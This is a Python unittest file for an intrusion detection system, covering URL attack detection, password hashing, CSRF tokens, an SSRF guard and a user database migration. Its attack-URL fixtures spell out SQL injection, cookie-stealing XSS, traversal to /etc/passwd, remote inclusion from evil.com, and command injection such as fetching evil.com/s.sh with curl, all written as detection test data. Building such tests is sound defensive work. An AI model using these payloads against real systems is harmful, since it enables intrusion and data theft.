"""Tests for the IDPS detection engine, security primitives and user store.

Standard library only -- run without installing anything:

    cd take2 && python3 -m unittest test_idps.py -v
"""

import os
import sqlite3
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import detection
import security
import store


# URLs a real user might submit. None of these may be reported.
BENIGN_URLS = [
    "https://www.google.com/search?q=how+to+learn+python",
    "https://example.com/page#section-2",
    "https://en.wikipedia.org/wiki/C--",
    "https://github.com/KingLeo7/Intelligent-Threat-Detection-System/blob/main/take2/app.py",
    "https://site.com/admin/login?redirect=/dashboard",
    "https://shop.com/product?id=123&update=true",
    "https://docs.python.org/3/library/re.html#module-re",
    "https://api.site.com/v1/users?select=name,email&limit=20",
    "https://cdn.site.com/img/logo.png?v=2",
    "https://news.site.com/2026/08/30/report-on-brute-strength-training",
    "https://mail.site.com/inbox?folder=drafts&sort=date",
    "https://site.com/reset-password?token=abc123def456",
    "https://accounts.site.com/oauth/authorize?client_id=x&redirect_uri=https://app.site.com/cb",
    "https://site.com/blog/why-innerHTML-is-risky",
    "https://site.com/files/report-Q3--final.pdf",
    "https://forum.site.com/thread/1024?page=3#reply-77",
    "https://site.com/api/v2/orders?status=failed&retry=true",
    "https://site.com/support/ticket?subject=login+failed+error",
]

# (url, category that must be reported)
ATTACK_URLS = [
    ("http://site.com/item?id=1' OR '1'='1", detection.SQL),
    ("http://site.com/login?user=admin'--&pw=x", detection.SQL),
    ("http://site.com/?id=1 UNION SELECT username,password FROM users", detection.SQL),
    ("http://site.com/?id=1 UNION/**/SELECT 1,2", detection.SQL),
    ("http://site.com/?id=1; DROP TABLE users", detection.SQL),
    ("http://site.com/?id=1;WAITFOR DELAY '0:0:5'--", detection.SQL),
    ("http://site.com/?id=-1 UNION SELECT table_name FROM information_schema.tables", detection.SQL),
    ("http://site.com/?q=<script>alert(1)</script>", detection.XSS),
    ("http://site.com/?q=<img src=x onerror=alert(1)>", detection.XSS),
    ("http://site.com/?q=<svg/onload=confirm(1)>", detection.XSS),
    ("http://site.com/?next=javascript:alert(document.cookie)", detection.XSS),
    ("http://site.com/page?file=../../../../etc/passwd", detection.LFI),
    ("http://site.com/dl?f=php://filter/convert.base64-encode/resource=index.php", detection.LFI),
    ("http://site.com/index.php?page=http://evil.com/shell.txt", detection.RFI),
    ("http://site.com/?template=https://attacker.io/p.php", detection.RFI),
    ("http://site.com/?cmd=;cat /etc/passwd", detection.CMDI),
    ("http://site.com/ping?host=8.8.8.8|whoami", detection.CMDI),
    ("http://site.com/?x=$(curl evil.com/s.sh)", detection.CMDI),
    ("http://site.com/?login=1&csrf_bypass=true", detection.CSRF),
    ("http://site.com/wp-login.php?tool=hydra&wordlist=rockyou.txt", detection.BRUTE),
]


class TestDetectionFalsePositives(unittest.TestCase):
    def test_benign_urls_are_not_reported(self):
        for url in BENIGN_URLS:
            with self.subTest(url=url):
                result = detection.evaluate(url)
                self.assertTrue(
                    result.safe,
                    f"false positive: {url} -> {result.summary} "
                    f"({[f.rules for f in result.findings]})",
                )

    def test_bare_double_dash_and_fragment_are_ignored(self):
        # The original engine matched `--` and `#` anywhere in the string.
        self.assertTrue(detection.evaluate("https://x.com/a--b#c").safe)

    def test_single_sql_keyword_is_below_threshold(self):
        result = detection.evaluate("https://x.com/api?select=name", only="sql")
        self.assertTrue(result.safe)


class TestDetectionCoverage(unittest.TestCase):
    def test_attacks_are_reported(self):
        for url, expected in ATTACK_URLS:
            with self.subTest(url=url):
                result = detection.evaluate(url)
                self.assertIn(expected, result.categories,
                              f"missed {expected} in {url} -> {result.summary}")

    def test_percent_encoded_payload_is_decoded(self):
        result = detection.evaluate("http://x.com/?q=%3Cscript%3Ealert(1)%3C/script%3E")
        self.assertIn(detection.XSS, result.categories)

    def test_double_encoded_payload_is_decoded(self):
        result = detection.evaluate("http://x.com/?q=%253Cscript%253Ealert(1)%253C/script%253E")
        self.assertIn(detection.XSS, result.categories)

    def test_encoded_traversal_is_decoded(self):
        result = detection.evaluate("http://x.com/?f=..%2F..%2F..%2Fetc%2Fpasswd")
        self.assertIn(detection.LFI, result.categories)

    def test_host_is_not_scanned(self):
        # `https://` in the URL itself must not trigger remote file inclusion.
        result = detection.evaluate("https://example.com/", only="rfi")
        self.assertTrue(result.safe)

    def test_severity_escalates_for_destructive_payloads(self):
        result = detection.evaluate("http://x.com/?id=1; DROP TABLE users")
        self.assertEqual("critical", result.severity)

    def test_only_filters_to_one_category(self):
        url = "http://x.com/?q=<script>alert(1)</script>&id=1' OR '1'='1"
        both = detection.evaluate(url)
        self.assertIn(detection.SQL, both.categories)
        self.assertIn(detection.XSS, both.categories)
        just_xss = detection.evaluate(url, only="xss")
        self.assertEqual([detection.XSS], just_xss.categories)

    def test_unknown_check_type_falls_back_to_full_scan(self):
        result = detection.evaluate("http://x.com/?q=<script>alert(1)</script>", only="bogus")
        self.assertIn(detection.XSS, result.categories)


class TestReflection(unittest.TestCase):
    def test_reflected_payload_escalates_to_critical(self):
        url = "http://x.com/?q=<script>alert(1)</script>"
        body = "<html><body>You searched for <script>alert(1)</script></body></html>"
        result = detection.evaluate(url, body=body)
        finding = next(f for f in result.findings if f.category == detection.XSS)
        self.assertTrue(finding.reflected)
        self.assertEqual("critical", finding.severity)

    def test_ordinary_html_body_is_not_scanned_for_rules(self):
        # A normal page full of iframes and onclick handlers is not an attack.
        body = ('<iframe src="/ads"></iframe><img src="a.png">'
                '<button onclick="go()">go</button><script>var x=1</script>')
        result = detection.evaluate("https://news.site.com/article/42", body=body)
        self.assertTrue(result.safe, result.summary)


class TestRuntimeSignals(unittest.TestCase):
    def test_brute_force_needs_runtime_evidence(self):
        url = "https://site.com/admin/login?next=/dashboard"
        self.assertTrue(detection.evaluate(url).safe)
        signal = detection.RuntimeSignal(
            category=detection.BRUTE, id="brute-runtime-lockout", weight=5,
            note="10 failed logins from 1.2.3.4",
        )
        flagged = detection.evaluate(url, runtime_signals=[signal])
        self.assertIn(detection.BRUTE, flagged.categories)
        self.assertIn("10 failed logins from 1.2.3.4",
                      flagged.findings[0].evidence)


class TestPasswordHashing(unittest.TestCase):
    def test_round_trip(self):
        stored = security.hash_password("correct horse battery staple")
        self.assertTrue(security.verify_password("correct horse battery staple", stored))

    def test_wrong_password_rejected(self):
        stored = security.hash_password("s3cret-passphrase")
        self.assertFalse(security.verify_password("s3cret-passphras", stored))
        self.assertFalse(security.verify_password("", stored))

    def test_salt_is_unique_per_hash(self):
        a = security.hash_password("same-password-here")
        b = security.hash_password("same-password-here")
        self.assertNotEqual(a, b)

    def test_plaintext_column_cannot_be_used_to_log_in(self):
        # A row that escaped migration must not authenticate with its plaintext.
        self.assertFalse(security.verify_password("rudra", "rudra"))

    def test_looks_hashed(self):
        self.assertTrue(security.looks_hashed(security.hash_password("abcdefgh")))
        self.assertFalse(security.looks_hashed("rudra"))
        self.assertFalse(security.looks_hashed(""))

    def test_needs_rehash_for_weak_iteration_count(self):
        weak = security.hash_password("abcdefgh", iterations=1000)
        self.assertTrue(security.needs_rehash(weak))
        self.assertFalse(security.needs_rehash(security.hash_password("abcdefgh")))

    def test_tampered_hash_is_rejected(self):
        stored = security.hash_password("abcdefgh")
        self.assertFalse(security.verify_password("abcdefgh", stored[:-4] + "0000"))
        self.assertFalse(security.verify_password("abcdefgh", "pbkdf2_sha256$x$y$z"))


class TestCredentialValidation(unittest.TestCase):
    def test_accepts_a_reasonable_pair(self):
        self.assertIsNone(security.validate_credentials("king_leo7", "a-long-enough-pw"))

    def test_rejects_short_password(self):
        self.assertIn("at least", security.validate_credentials("kingleo", "short1"))

    def test_rejects_common_password(self):
        self.assertIn("too common", security.validate_credentials("kingleo", "password123"))

    def test_rejects_password_equal_to_username(self):
        self.assertIsNotNone(security.validate_credentials("rudraaaaa", "rudraaaaa"))

    def test_rejects_bad_username_characters(self):
        self.assertIsNotNone(security.validate_credentials("rob<script>", "a-long-enough-pw"))

    def test_rejects_empty(self):
        self.assertIsNotNone(security.validate_credentials("", ""))


class TestCsrfTokens(unittest.TestCase):
    def test_matching_tokens(self):
        token = security.new_csrf_token()
        self.assertTrue(security.csrf_tokens_match(token, token))

    def test_mismatched_or_missing_tokens(self):
        token = security.new_csrf_token()
        self.assertFalse(security.csrf_tokens_match(token, token + "x"))
        self.assertFalse(security.csrf_tokens_match(token, None))
        self.assertFalse(security.csrf_tokens_match(None, token))
        self.assertFalse(security.csrf_tokens_match("", ""))


class TestSsrfGuard(unittest.TestCase):
    """The scanner may fetch the URL it is given, so the guard is load bearing."""

    @staticmethod
    def resolver(mapping):
        def resolve(host, port):
            if host not in mapping:
                raise OSError("NXDOMAIN")
            return mapping[host]
        return resolve

    def test_allows_a_public_host(self):
        decision = security.validate_fetch_target(
            "https://example.com/page", self.resolver({"example.com": ["93.184.216.34"]})
        )
        self.assertTrue(decision.allowed, decision.reason)

    def test_blocks_loopback_literal(self):
        self.assertFalse(security.validate_fetch_target("http://127.0.0.1:80/").allowed)

    def test_blocks_localhost_name(self):
        self.assertFalse(security.validate_fetch_target("http://localhost/admin").allowed)

    def test_blocks_cloud_metadata(self):
        self.assertFalse(security.validate_fetch_target("http://169.254.169.254/latest/meta-data/").allowed)
        self.assertFalse(security.validate_fetch_target("http://metadata.google.internal/").allowed)

    def test_blocks_private_ranges(self):
        for host in ("10.0.0.5", "192.168.1.1", "172.16.4.4", "[::1]", "[::ffff:127.0.0.1]"):
            with self.subTest(host=host):
                self.assertFalse(security.validate_fetch_target(f"http://{host}/").allowed)

    def test_blocks_dns_that_resolves_to_loopback(self):
        decision = security.validate_fetch_target(
            "http://sneaky.example/", self.resolver({"sneaky.example": ["127.0.0.1"]})
        )
        self.assertFalse(decision.allowed)
        self.assertIn("non-public", decision.reason)

    def test_blocks_split_horizon_dns(self):
        # One public and one internal answer: still refused.
        decision = security.validate_fetch_target(
            "http://mixed.example/",
            self.resolver({"mixed.example": ["93.184.216.34", "10.1.2.3"]}),
        )
        self.assertFalse(decision.allowed)

    def test_blocks_non_http_schemes(self):
        for url in ("file:///etc/passwd", "gopher://x.com/", "ftp://x.com/f"):
            with self.subTest(url=url):
                self.assertFalse(security.validate_fetch_target(url).allowed)

    def test_blocks_credentials_in_url(self):
        self.assertFalse(security.validate_fetch_target("http://user:pw@example.com/").allowed)

    def test_blocks_unusual_ports(self):
        decision = security.validate_fetch_target(
            "http://example.com:6379/", self.resolver({"example.com": ["93.184.216.34"]})
        )
        self.assertFalse(decision.allowed)
        self.assertIn("port", decision.reason)

    def test_unresolvable_host_is_refused(self):
        decision = security.validate_fetch_target("http://nope.invalid/", self.resolver({}))
        self.assertFalse(decision.allowed)


class TestStoreMigration(unittest.TestCase):
    def setUp(self):
        handle, self.path = tempfile.mkstemp(suffix=".db")
        os.close(handle)
        os.unlink(self.path)

    def tearDown(self):
        if os.path.exists(self.path):
            os.unlink(self.path)

    def _legacy_db(self):
        """Recreate the old schema: no role column, plaintext passwords."""
        conn = sqlite3.connect(self.path)
        conn.execute("""CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT)""")
        conn.executemany(
            "INSERT INTO users (username, password) VALUES (?, ?)",
            [("rudra", "rudra"), ("alice", "alice-plaintext-pw"), ("bob", "")],
        )
        conn.commit()
        conn.close()

    def test_migrates_plaintext_and_adds_role(self):
        self._legacy_db()
        report = store.init_db(self.path, admin_username="rudra")
        self.assertEqual(3, report["migrated"])
        self.assertFalse(report["created_admin"])

        conn = store.connect(self.path)
        try:
            rudra = store.find_user(conn, "rudra")
            alice = store.find_user(conn, "alice")
            bob = store.find_user(conn, "bob")
            # Existing accounts still work with their original passwords.
            self.assertTrue(security.verify_password("rudra", rudra["password"]))
            self.assertTrue(security.verify_password("alice-plaintext-pw", alice["password"]))
            # The row with a blank password is not left loginable.
            self.assertFalse(security.verify_password("", bob["password"]))
            self.assertEqual("admin", rudra["role"])
            self.assertEqual("user", alice["role"])
        finally:
            conn.close()

    def test_migration_is_idempotent(self):
        self._legacy_db()
        store.init_db(self.path, admin_username="rudra")
        second = store.init_db(self.path, admin_username="rudra")
        self.assertEqual(0, second["migrated"])
        conn = store.connect(self.path)
        try:
            self.assertTrue(
                security.verify_password("rudra", store.find_user(conn, "rudra")["password"])
            )
        finally:
            conn.close()

    def test_seeds_admin_with_generated_password_on_fresh_db(self):
        report = store.init_db(self.path, admin_username="rudra")
        self.assertTrue(report["created_admin"])
        self.assertTrue(report["generated_password"])
        conn = store.connect(self.path)
        try:
            row = store.find_user(conn, "rudra")
            self.assertEqual("admin", row["role"])
            self.assertTrue(
                security.verify_password(report["generated_password"], row["password"])
            )
            # The published default credential no longer works.
            self.assertFalse(security.verify_password("rudra", row["password"]))
        finally:
            conn.close()

    def test_seeds_admin_from_supplied_password(self):
        report = store.init_db(
            self.path, admin_username="root", admin_password="chosen-admin-pw"
        )
        self.assertIsNone(report["generated_password"])
        conn = store.connect(self.path)
        try:
            self.assertTrue(security.verify_password(
                "chosen-admin-pw", store.find_user(conn, "root")["password"]
            ))
        finally:
            conn.close()

    def test_create_user_and_delete_non_admins(self):
        store.init_db(self.path, admin_username="rudra", admin_password="admin-password")
        conn = store.connect(self.path)
        try:
            store.create_user(conn, "alice", "alice-password")
            store.create_user(conn, "bob", "bob-password")
            self.assertEqual(3, len(store.list_users(conn)))
            with self.assertRaises(sqlite3.IntegrityError):
                store.create_user(conn, "alice", "another-password")
            self.assertEqual(2, store.delete_non_admins(conn))
            remaining = store.list_users(conn)
            self.assertEqual(["rudra"], [r["username"] for r in remaining])
        finally:
            conn.close()

    def test_set_password_replaces_hash(self):
        store.init_db(self.path, admin_username="rudra", admin_password="admin-password")
        conn = store.connect(self.path)
        try:
            row = store.find_user(conn, "rudra")
            store.set_password(conn, row["id"], "a-brand-new-password")
            updated = store.find_user(conn, "rudra")
            self.assertTrue(security.verify_password("a-brand-new-password", updated["password"]))
            self.assertFalse(security.verify_password("admin-password", updated["password"]))
        finally:
            conn.close()


if __name__ == "__main__":
    unittest.main(verbosity=2)
